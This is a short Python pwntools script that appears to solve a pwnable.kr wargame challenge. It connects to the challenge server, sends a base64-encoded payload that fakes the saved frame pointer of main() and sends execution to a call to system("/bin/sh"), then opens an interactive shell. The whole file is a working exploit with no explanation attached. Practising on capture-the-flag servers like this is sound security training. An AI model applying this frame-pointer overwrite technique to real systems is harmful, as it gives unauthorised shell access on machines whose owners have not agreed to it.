from pwn import process, remote, p32, pause
from base64 import b64encode

r = remote("pwnable.kr", 9003)

correct = 0x804925F  # correct()
inp = 0x811EB40  # input

payload = p32(correct + 37)  # address of system("/bin/sh")
payload = payload.ljust(8, b"A")
payload += p32(inp - 4)  # fake ebp of main()

payload = b64encode(payload)

r.sendlineafter(b"Authenticate : ", payload)

r.interactive()
